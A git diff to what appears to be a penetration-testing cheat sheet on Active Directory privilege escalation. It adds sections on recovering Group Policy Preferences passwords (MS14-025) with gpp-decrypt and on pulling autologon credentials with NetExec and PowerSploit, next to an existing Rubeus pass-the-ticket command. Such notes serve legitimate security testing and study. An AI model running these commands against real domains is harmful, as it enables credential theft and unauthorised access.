@@ -1,7 +1,7 @@
 ---
 layout: app
 title: "Active Directory - PrivEsc"
-tags: ["privesc","powerup","powerview","abuse service", "sc.exe", "Rubeus","permissions", "netloader","winrs","SafetyKats"]
+tags: ["privesc","powerup","powerview","abuse service", "sc.exe", "Rubeus","permissions", "netloader","winrs","SafetyKats", "MS14-025","gpp-decrypt","autologon"]
 
 ---
 
@@ -57,6 +57,35 @@ With **aes256_hmac** can be use **Rubeus** to execute command
 ```powershell
 Rubeus.exe asktgt /user:<username> /aes256:<aes256_hmac> /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt
 ```
+
+# MS14-025
+
+(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN]
+
+The password stored within Groups.xml inside SYSVOL share folder, must be decrypted use the Password published by Microsoft.
+
+Use **gpp-decrypt** to do that.
+
+```powershell
+gpp-decrypt "EncryptedPassword"
+```
+
+## Enumeration
+
+(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN]
+
+
+# Autologon
+
+When auto logon is configured via Group Policy, can found the password into Registry.xml file.
+
+## Tools
+
+```powershell
+NetExec smb -u <UserName> -p <Password> -d <Domain> -M gpp_autologin
+```
+* Get-GPPAutologon.ps1 (PowerSploit)
+
 
 ## PowerSploit
 
